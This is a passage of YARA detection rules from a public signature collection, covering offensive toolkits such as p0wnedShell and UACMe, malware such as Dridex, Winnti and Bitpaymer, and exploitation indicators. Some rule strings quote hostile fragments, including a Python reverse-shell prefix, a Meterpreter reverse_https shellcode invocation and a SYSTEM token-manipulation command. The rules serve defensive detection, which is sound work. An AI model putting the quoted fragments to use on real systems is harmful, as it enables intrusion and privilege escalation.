		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_project_sauron_extras.yar#L89-L104"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "7dbfb3ddfffa6fa65800e07fdcc527650474740afa658567efe46830587cedae"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$x1 = "Assemble rows of DNS names back to a single string of data"
		$x2 = "removes checks of DNS names and lengths (during split)"
		$x3 = "Randomize data lengths (length/2 to length)"
		$x4 = "This cruft"

	condition:
		2 of them
}

rule SIGNATURE_BASE_ACE_Containing_EXE
{
	meta:
		description = "Looks for ACE Archives containing an exe/scr file"
		author = "Florian Roth (Nextron Systems) - based on Nick Hoffman' rule - Morphick Inc"
		id = "0756f0e7-39f1-572d-a77d-1f7826332360"
		date = "2015-09-09"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_ace_with_exe.yar#L2-L20"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "27fba0db7a98fbaf4b3710a9e411ed74860099c133a2e83ddf368ae2fef3c288"
		score = 50
		quality = 83
		tags = ""

	strings:
		$header = { 2a 2a 41 43 45 2a 2a }
		$extensions1 = ".exe"
		$extensions2 = ".EXE"
		$extensions3 = ".scr"
		$extensions4 = ".SCR"

	condition:
		$header at 7 and for any of ( $extensions* ) : ( $ in ( 81 .. ( 81 + uint16( 79 ) ) ) )
}

rule SIGNATURE_BASE_P0Wnedpotato
{
	meta:
		description = "p0wnedShell Runspace Post Exploitation Toolkit - file p0wnedPotato.cs"
		author = "Florian Roth (Nextron Systems)"
		id = "2c2378e3-b948-5325-9afd-76424a7130b1"
		date = "2017-01-14"
		modified = "2023-12-05"
		reference = "https://github.com/Cn33liz/p0wnedShell"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_p0wnshell.yar#L64-L81"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "d9107db6c6460429358a2f9f1f47d103e96811152e8d03517871ff0c66578d05"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "aff2b694a01b48ef96c82daf387b25845abbe01073b76316f1aab3142fdb235b"

	strings:
		$x1 = "Invoke-Tater" fullword ascii
		$x2 = "P0wnedListener.Execute(WPAD_Proxy);" fullword ascii
		$x3 = " -SpooferIP " ascii
		$x4 = "TaterCommand()" ascii
		$x5 = "FileName = \"cmd.exe\"," fullword ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_P0Wnedexploits
{
	meta:
		description = "p0wnedShell Runspace Post Exploitation Toolkit - file p0wnedExploits.cs"
		author = "Florian Roth (Nextron Systems)"
		id = "9f754f5f-85e8-5b6f-bde2-566da4d39586"
		date = "2017-01-14"
		modified = "2023-12-05"
		reference = "https://github.com/Cn33liz/p0wnedShell"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_p0wnshell.yar#L83-L97"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "40f23316117faa63fa9e9a5d281600f8e9d41857aac815d22559391c74dec157"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "54548e7848e742566f5596d8f02eca1fd2cbfeae88648b01efb7bab014b9301b"

	strings:
		$x1 = "Pshell.RunPSCommand(Whoami);" fullword ascii
		$x2 = "If succeeded this exploit should popup a System CMD Shell" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_P0Wnedshellx64
{
	meta:
		description = "p0wnedShell Runspace Post Exploitation Toolkit - file p0wnedShellx64.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "c9791804-4f08-5b7e-8d9d-37e2dfccec47"
		date = "2017-01-14"
		modified = "2021-09-15"
		reference = "https://github.com/Cn33liz/p0wnedShell"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_p0wnshell.yar#L99-L118"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "d7cd33548ed3485cc6f3cd289813a8eb83b34e800b839c5c8f8add5f9e01a3da"
		score = 75
		quality = 85
		tags = ""
		hash1 = "d8b4f5440627cf70fa0e0e19e0359b59e671885f8c1855517211ba331f48c449"

	strings:
		$x1 = "Oq02AB+LCAAAAAAABADs/QkW3LiOLQBuRUsQR1H731gHMQOkFGFnvvrdp/O4sp6tkDiAIIjhAryu4z6PVOtxHuXz3/xT6X9za/Df/Hsa/JT/9Pjgb/+kPPhv9Sjp01Wf" wide
		$x2 = "Invoke-TokenManipulation" wide
		$x3 = "-CreateProcess \"cmd.exe\" -Username \"nt authority\\system\"" fullword wide
		$x4 = "CommandShell with Local Administrator privileges :)" fullword wide
		$x5 = "Invoke-shellcode -Payload windows/meterpreter/reverse_https -Lhost " fullword wide
		$fp1 = "AVSignature" ascii wide

	condition:
		1 of ( $x* ) and not 1 of them
}

rule SIGNATURE_BASE_P0Wnedlistenerconsole
{
	meta:
		description = "p0wnedShell Runspace Post Exploitation Toolkit - file p0wnedListenerConsole.cs"
		author = "Florian Roth (Nextron Systems)"
		id = "77d13c34-3e15-5bc1-a100-f04be38cfb44"
		date = "2017-01-14"
		modified = "2023-12-05"
		reference = "https://github.com/Cn33liz/p0wnedShell"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_p0wnshell.yar#L120-L140"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "068e590f6f4f99c27814f2bf96d51e1c8c6422afcf8b99bb9f1852216335da7b"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "d2d84e65fad966a8556696fdaab5dc8110fc058c9e9caa7ea78aa00921ae3169"

	strings:
		$x1 = "Invoke_ReflectivePEInjection" fullword wide
		$x5 = "p0wnedShell> " fullword wide
		$x6 = "Resources.Get_PassHashes" fullword wide
		$s7 = "Invoke_CredentialsPhish" fullword wide
		$s8 = "Invoke_Shellcode" fullword wide
		$s9 = "Resources.Invoke_TokenManipulation" fullword wide
		$s10 = "Resources.Port_Scan" fullword wide
		$s20 = "Invoke_PowerUp" fullword wide

	condition:
		1 of them
}

rule SIGNATURE_BASE_P0Wnedbinaries
{
	meta:
		description = "p0wnedShell Runspace Post Exploitation Toolkit - file p0wnedBinaries.cs"
		author = "Florian Roth (Nextron Systems)"
		id = "0c62dd3a-195c-5890-b262-2eb00c58f8c1"
		date = "2017-01-14"
		modified = "2023-12-05"
		reference = "https://github.com/Cn33liz/p0wnedShell"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_p0wnshell.yar#L142-L161"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "4df7fcf508a9257ea418bd1995158c3676037b310dc884d44658977fda81b13b"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "fd7014625b58d00c6e54ad0e587c6dba5d50f8ca4b0f162d5af3357c2183c7a7"

	strings:
		$x1 = "Oq02AB+LCAAAAAAABADs/QkW3LiOLQBuRUsQR1H731gHMQOkFGFnvvrdp/O4sp6tkDiAIIjhAryu4z6PVOtxHuXz3/xT6X9za/Df/Hsa/JT/9" ascii
		$x2 = "wpoWAB+LCAAAAAAABADs/QeyK7uOBYhORUNIenL+E2vBA0ympH3erY4f8Tte3TpbUiY9YRbcGK91vVKtr+tV3v/B/yr/m1vD/+DvNOVb+V/f" ascii
		$x3 = "mo0MAB+LCAAAAAAABADsXQl24zqu3YqXII6i9r+xJ4AACU4SZcuJnVenf/9OxbHEAcRwcQGu62NbHsrax/Iw+3/hP5b+VzuH/4WfVeDf8n98" ascii
		$x4 = "LE4CAB+LCAAAAAAABADsfQmW2zqu6Fa8BM7D/jf2hRmkKNuVm/Tt9zunkipb4giCIGb2/prhFUt5hVe+/sNP4b+pVvwPn+OQp/LT9ge/+" ascii
		$x5 = "XpMCAB+LCAAAAAAABADsfQeWIzmO6FV0hKAn73+xL3iAwVAqq2t35r/tl53VyhCDFoQ3Y7zW9Uq1vq5Xef/CT+X/59bwFz6nKU/lp+8P/" ascii
		$x6 = "STwAAB+LCAAAAAAABADtWwmy6yoO3YqXgJjZ/8ZaRwNgx/HNfX/o7qqUkxgzCM0SmLR2jHBQzkc4En9xZbvHUuSLMnWv9ateK/70ilStR" ascii
		$x7 = "namespace p0wnedShell" fullword ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_P0Wnedamsibypass
{
	meta:
		description = "p0wnedShell Runspace Post Exploitation Toolkit - file p0wnedAmsiBypass.cs"
		author = "Florian Roth (Nextron Systems)"
		id = "168af265-d3e9-59a2-b754-20d6c9a298b1"
		date = "2017-01-14"
		modified = "2023-12-05"
		reference = "https://github.com/Cn33liz/p0wnedShell"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_p0wnshell.yar#L163-L178"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "1f7613506058706fc74979fdd4f9e425e9d16527120e0f2f49bc21e3e43d3b16"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "345e8e6f38b2914f4533c4c16421d372d61564a4275537e674a2ac3360b19284"

	strings:
		$x1 = "Program.P0wnedPath()" fullword ascii
		$x2 = "namespace p0wnedShell" fullword ascii
		$x3 = "H4sIAAAAAAAEAO1YfXRUx3WflXalFazQgiVb5nMVryzxIbGrt/rcFRZIa1CQYEFCQnxotUhP2pX3Q337HpYotCKrPdbmoQQnkOY0+BQCNKRpe" ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_P0Wnedshell_Outputs
{
	meta:
		description = "p0wnedShell Runspace Post Exploitation Toolkit - from files p0wnedShell.cs, p0wnedShell.cs"
		author = "Florian Roth (Nextron Systems)"
		id = "c19fc14b-0c42-5dd1-bff2-ba75f4168d9c"
		date = "2017-01-14"
		modified = "2023-12-05"
		reference = "https://github.com/Cn33liz/p0wnedShell"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_p0wnshell.yar#L180-L196"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "85d5317a473d981fe6ee1362789f34653a838c63d823bb62028a25c9db27cf6e"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash1 = "e1f35310192416cd79e60dba0521fc6eb107f3e65741c344832c46e9b4085e60"

	strings:
		$s1 = "[+] For this attack to succeed, you need to have Admin privileges." fullword ascii
		$s2 = "[+] This is not a valid hostname, please try again" fullword ascii
		$s3 = "[+] First return the name of our current domain." fullword ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_Base64_PS1_Shellcode
{
	meta:
		description = "Detects Base64 encoded PS1 Shellcode"
		author = "Nick Carr, David Ledbetter"
		id = "7c3cec3b-a192-5bfd-b4f1-22b1afeb717e"
		date = "2018-11-14"
		modified = "2023-12-05"
		reference = "https://twitter.com/ItsReallyNick/status/1062601684566843392"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_ps1_shellcode.yar#L1-L15"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "fac6f41965eb2209f1552763800d6a2b172f28cd29bb7586d180654aab1e6d56"
		score = 65
		quality = 85
		tags = ""

	strings:
		$substring = "AAAAYInlM"
		$pattern1 = "/OiCAAAAYInlM"
		$pattern2 = "/OiJAAAAYInlM"

	condition:
		$substring and 1 of ( $p* )
}

rule SIGNATURE_BASE_Streamex_Shellcrew
{
	meta:
		description = "Detects a "
		author = "Cylance"
		id = "217077bb-71b7-5cbf-8adf-68a16688c415"
		date = "2017-02-09"
		modified = "2023-12-05"
		reference = "https://blog.cylance.com/shell-crew-variants-continue-to-fly-under-big-avs-radar"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_shellcrew_streamex.yar#L11-L29"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "a82ff51c1dcd1ebe3d7acc96b46b0b79dcead9146204f060f5413c4c7b5286d3"
		score = 80
		quality = 85
		tags = ""

	strings:
		$a = "0r+8DQY97XGB5iZ4Vf3KsEt61HLoTOuIqJPp2AlncRCgSxUWyebhMdmzvFjNwka="
		$b = {34 ?? 88 04 11 48 63 C3 48 FF C1 48 3D D8 03 00 00}
		$bb = {81 86 ?? ?? 00 10 34 ?? 88 86 ?? ?? 00 10 46 81 FE D8 03 00 00}
		$c = "greendll"
		$d = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" wide
		$f = {26 5E 25 24 23 91 91 91 91}
		$g = "D:\\pdb\\ht_d6.pdb"

	condition:
		$a or $b or $bb or ( $c and $d ) or $f or $g
}

rule SIGNATURE_BASE_Dexter_Malware
{
	meta:
		description = "Detects the Dexter Trojan/Agent http://goo.gl/oBvy8b"
		author = "Florian Roth (Nextron Systems)"
		id = "8be328ec-ba29-50ba-8d35-e2c4dfcae45e"
		date = "2015-02-10"
		modified = "2023-12-05"
		reference = "http://goo.gl/oBvy8b"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/crime_dexter_trojan.yar#L1-L17"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "3b05bccce63c1f7e8d6d3f654b611f33da5fc1dbcbd28ff28f817d00bf961e64"
		score = 70
		quality = 60
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Java Security Plugin" fullword wide
		$s1 = "%s\\%s\\%s.exe" fullword wide
		$s2 = "Sun Java Security Plugin" fullword wide
		$s3 = "\\Internet Explorer\\iexplore.exe" wide

	condition:
		all of them
}

rule SIGNATURE_BASE_EXPL_Manageengine_CVE_2022_47966_Jan23_1
{
	meta:
		description = "Detects indicators of exploitation of ManageEngine vulnerability as described by Horizon3"
		author = "Florian Roth (Nextron Systems)"
		id = "07535b9c-8611-5a46-bcd7-f94070de2aea"
		date = "2023-01-13"
		modified = "2023-12-05"
		reference = "https://www.horizon3.ai/manageengine-cve-2022-47966-iocs/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/expl_manageengine_jan23.yar#L2-L14"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "a62064e4f12632ba6c14cbbd9369ee919536334f19021a177c126b5dff7e568c"
		score = 75
		quality = 85
		tags = ""

	strings:
		$ = "]: com.adventnet.authentication.saml.SamlException: Signature validation failed. SAML Response rejected|"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Crime_Win32_Dridex_Socks5_Mod
{
	meta:
		description = "Detects Dridex socks5 module"
		author = "@VK_Intel"
		id = "cee256b1-ad80-55dd-bbd3-0d3f7bc49664"
		date = "2020-04-06"
		modified = "2023-12-05"
		reference = "https://twitter.com/VK_Intel/status/1247058432223477760"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/crime_evilcorp_dridex_banker.yar#L8-L20"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "5ca09e9c7d94e949e453d1bb69b566c12b253579cbcae700929d4f517df35a0a"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "socks5_2_x32.dll"
		$s1 = "socks5_2_x64.dll"

	condition:
		any of ( $s* ) and pe.exports ( "start" )
}

rule SIGNATURE_BASE_Crime_Win32_Hvnc_Banker_Gen
{
	meta:
		description = "Detects malware banker hidden VNC"
		author = "@VK_Intel"
		id = "5e13f4a9-2231-524f-82b2-fbc6d6a43b6f"
		date = "2020-04-06"
		modified = "2023-12-05"
		reference = "https://twitter.com/VK_Intel/status/1247058432223477760"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/crime_evilcorp_dridex_banker.yar#L22-L31"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "b01af685c3826834aadaf4eac1f1d8171db288a2efa7b769d8122421f7af8d7e"
		score = 75
		quality = 85
		tags = ""

	condition:
		pe.exports( "VncStartServer" ) and pe.exports ( "VncStopServer" )
}

rule SIGNATURE_BASE_FE_LEGALSTRIKE_MACRO
{
	meta:
		description = "This rule is designed to identify macros with the specific encoding used in the sample 30f149479c02b741e897cdb9ecd22da7."
		author = "Ian.Ahl@fireeye.com @TekDefense - modified by Florian Roth"
		id = "eb15e5aa-16e5-5c07-a293-ad15c0c09d8e"
		date = "2017-06-02"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_apt19.yar#L34-L50"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "b38edeedcc02168d3ba7e82c3f5c6963ffc8ce1688eeb424ce686484f3687512"
		score = 75
		quality = 85
		tags = ""
		version = ".1"
		filetype = "MACRO"

	strings:
		$ob1 = "ChrW(114) & ChrW(101) & ChrW(103) & ChrW(115) & ChrW(118) & ChrW(114) & ChrW(51) & ChrW(50) & ChrW(46) & ChrW(101)" ascii wide
		$wsobj1 = "Set Obj = CreateObject(\"WScript.Shell\")" ascii wide
		$wsobj2 = "Obj.Run " ascii wide

	condition:
		all of them
}

rule SIGNATURE_BASE_UACME_Akagi
{
	meta:
		description = "Rule to detect UACMe - abusing built-in Windows AutoElevate backdoor"
		author = "Florian Roth (Nextron Systems)"
		id = "7979129e-99a3-522a-8285-9061e1e2bd41"
		date = "2015-05-14"
		modified = "2023-12-05"
		reference = "https://github.com/hfiref0x/UACME"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/exploit_uac_elevators.yar#L35-L64"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "e10f39837a53dcc6d301d21a69fca965aeca0a07cfc832a9a0142b08d280f955"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "edd2138bbd9e76c343051c6dc898054607f2040a"
		hash2 = "e3a919ccc2e759e618208ededa8a543954d49f8a"

	strings:
		$x1 = "UACMe injected, Fubuki at your service." wide fullword
		$x3 = "%temp%\\Hibiki.dll" fullword wide
		$x4 = "[UCM] Cannot write to the target process memory." fullword wide
		$s1 = "%systemroot%\\system32\\cmd.exe" wide
		$s2 = "D:(A;;GA;;;WD)" wide
		$s3 = "%systemroot%\\system32\\sysprep\\sysprep.exe" fullword wide
		$s4 = "/c wusa %ws /extract:%%windir%%\\system32" fullword wide
		$s5 = "Fubuki.dll" ascii fullword
		$l1 = "ntdll.dll" ascii
		$l2 = "Cabinet.dll" ascii
		$l3 = "GetProcessHeap" ascii
		$l4 = "WriteProcessMemory" ascii
		$l5 = "ShellExecuteEx" ascii

	condition:
		(1 of ( $x* ) ) or ( 3 of ( $s* ) and all of ( $l* ) )
}

rule SIGNATURE_BASE_SUSP_PY_Import_Statement_Apr24_1
{
	meta:
		description = "Detects suspicious Python import statement and socket usage often found in Python reverse shells"
		author = "Florian Roth"
		id = "8e05f9a1-40a8-5d01-9e45-8779b0ff7a45"
		date = "2024-04-15"
		modified = "2025-03-21"
		reference = "https://www.volexity.com/blog/2024/04/12/zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/vuln_paloalto_cve_2024_3400_apr24.yar#L67-L79"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "d5c199d9c3e449ca282f0ca91c94ac783709299b3489f7cec38177a2f843b504"
		score = 65
		quality = 85
		tags = ""

	strings:
		$x1 = "import sys,socket,os,pty;s=socket.socket("

	condition:
		1 of them
}

rule SIGNATURE_BASE_MAL_NET_Katz_Stealer_Loader_May25
{
	meta:
		description = "Detects .NET based Katz stealer loader"
		author = "Jonathan Peters (cod3nym)"
		id = "90e86bb2-ffb2-5968-9cdc-705efac73b0d"
		date = "2025-05-21"
		modified = "2025-05-22"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/mal_katz_stealer.yar#L65-L84"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "0df13fd42fb4a4374981474ea87895a3830eddcc7f3bd494e76acd604c4004f7"
		logic_hash = "1922520d8c34660a0afff2f552ef0d1c6ec093fb10a00816e0216f574b686221"
		score = 80
		quality = 85
		tags = ""

	strings:
		$x = "ExecutarMetodoVAI" ascii
		$s1 = "VirtualMachineDetector" ascii
		$s2 = "Wow64SetThreadContext_API" ascii
		$s3 = "nomedoarquivo" ascii
		$s4 = { 65 78 74 65 6E C3 A7 61 6F 00 }
		$s5 = "payloadBuffer" ascii
		$s6 = "caminhovbs" ascii

	condition:
		3 of ( $s* ) or $x
}

rule SIGNATURE_BASE_Dridex_Trojan_XML
{
	meta:
		description = "Dridex Malware in XML Document"
		author = "Florian Roth (Nextron Systems) @4nc4p"
		id = "a8f3406c-f8b0-559f-be12-6b2a7d401ac2"
		date = "2015-03-08"
		modified = "2023-12-05"
		reference = "https://threatpost.com/dridex-banking-trojan-spreading-via-macros-in-xml-files/111503"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/crime_dridex_xml.yar#L1-L23"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "25b6340d782ee20723b2f17f3434a0b27b1561ab22d5a8f859e97e0ac126f651"
		score = 75
		quality = 85
		tags = ""
		hash1 = "88d98e18ed996986d26ce4149ae9b2faee0bc082"
		hash2 = "3b2d59adadf5ff10829bb5c27961b22611676395"
		hash3 = "e528671b1b32b3fa2134a088bfab1ba46b468514"
		hash4 = "981369cd53c022b434ee6d380aa9884459b63350"
		hash5 = "96e1e7383457293a9b8f2c75270b58da0e630bea"

	strings:
		$c_xml = "<?xml version="
		$c_word = "<?mso-application progid=\"Word.Document\"?>"
		$c_macro = "w:macrosPresent=\"yes\""
		$c_binary = "<w:binData w:name="
		$c_0_chars = "<o:Characters>0</o:Characters>"
		$c_1_line = "<o:Lines>1</o:Lines>"

	condition:
		all of ( $c* )
}

rule SIGNATURE_BASE_Bitpaymer_1
{
	meta:
		description = "Rule to detect newer Bitpaymer samples. Rule is based on BitPaymer custom packer"
		author = "Morphisec labs"
		id = "916de232-1f1b-5853-a57f-623812cfed16"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "http://blog.morphisec.com/bitpaymer-ransomware-with-new-custom-packer-framework"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_crime_bitpaymer.yar#L1-L12"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "0c236794c04f0805d4611cfaf43369eeb4d0e65d6c697e6c5e6afd321fbca629"
		score = 75
		quality = 85
		tags = ""

	strings:
		$opcodes1 = {B9 ?? 00 00 00 FF 14 0F B8 FF 00 00 00 C3 89 45 FC}
		$opcodes2 = {61 55 FF 54 B7 01 B0 FF C9 C3 CC 89 45 FC}

	condition:
		( uint16( 0 ) == 0x5a4d ) and ( $opcodes1 or $opcodes2 )
}

rule SIGNATURE_BASE_APT_Winnti_MAL_Dec19_2
{
	meta:
		description = "Detects Winnti malware"
		author = "Unknown"
		id = "77f2cb7d-90a6-5654-9d2e-6b525cd910a2"
		date = "2019-12-06"
		modified = "2023-12-05"
		reference = "https://www.verfassungsschutz.de/download/broschuere-2019-12-bfv-cyber-brief-2019-01.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_winnti.yar#L178-L201"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "216557999b7100f26556f9f7088b16ba125ac39b308cb77c997d620ce9591d24"
		score = 75
		quality = 85
		tags = ""

	strings:
		$a1 = "IPSecMiniPort" wide fullword
		$a2 = "ndis6fw" wide fullword
		$a3 = "TCPIP" wide fullword
		$a4 = "NDIS.SYS" ascii fullword
		$a5 = "ntoskrnl.exe" ascii fullword
		$a6 = "\\BaseNamedObjects\\{B2B87CCA-66BC-4C24-89B2-C23C9EAC2A66}" wide
		$a7 = "\\Device\\Null" wide
		$a8 = "\\Device" wide
		$a9 = "\\Driver" wide
		$b1 = { 66 81 7? ?? 70 17 }
		$b2 = { 81 7? ?? 07 E0 15 00 }
		$b3 = { 8B 46 18 3D 03 60 15 00 }

	condition:
		(6 of ( $a* ) ) and ( 2 of ( $b* ) )
}

rule SIGNATURE_BASE_APT_Winnti_MAL_Dec19_3
{
	meta:
		description = "Detects Winnti malware"
		author = "Unknown"
		id = "2e001c91-0794-5940-ad8c-8e58a01e100c"
		date = "2019-12-06"
		modified = "2023-12-05"
		reference = "https://www.verfassungsschutz.de/download/broschuere-2019-12-bfv-cyber-brief-2019-01.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_winnti.yar#L203-L219"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "d09f948c9bf685de64e8a6f1c95d95b806651866f3364d5d9b8b2351c1a68be3"
		score = 75
		quality = 85
		tags = ""

	strings:
		$b1 = { 0F B7 ?? 16 [0-1] (81 E? | 25) 00 20 [0-2] [8] 8B ?? 50 41 B9 40 00 00 00 41 B8 00 10 00 00 }
		$b2 = { 8B 40 28 [5-8] 48 03 C8 48 8B C1 [5-8] 48 89 41 28 }
		$b3 = { 48 6B ?? 28 [5-8] 8B ?? ?? 10 [5-8] 48 6B ?? 28 [5-8] 8B ?? ?? 14 }
		$b4 = { 83 B? 90 00 00 00 00 0F 84 [9-12] 83 B? 94 00 00 00 00 0F 84 }
		$b5 = { (45 | 4D) (31 | 33) C0 BA 01 00 00 00 [10-16] FF 5? 28 [0-1] (84 | 85) C0 }

	condition:
		(4 of ( $b* ) )
}

rule SIGNATURE_BASE_APT_Winnti_MAL_Dec19_4
{
	meta:
		description = "Detects Winnti malware"
		author = "Unknown"
		id = "1f7ac215-d049-5b97-9797-9589a70cbf2b"
		date = "2019-12-06"
		modified = "2023-12-05"
		reference = "https://www.verfassungsschutz.de/download/broschuere-2019-12-bfv-cyber-brief-2019-01.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_winnti.yar#L221-L235"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "32909e915a6e602ad1e8698cf5c128c2e54670770b97f54b1414c5798c42cc00"
		score = 75
		quality = 85
		tags = ""

	strings:
		$b1 = { 4C 8D 41 24 33 D2 B9 03 00 1F 00 FF 9? F8 00 00 00 48 85 C0 74 }
		$b2 = { 4C 8B 4? 08 BA 01 00 00 00 49 8B C? FF D0 85 C0 [2-6] C7 4? 1C 01 00 00 00 B8 01 00 00 00 }
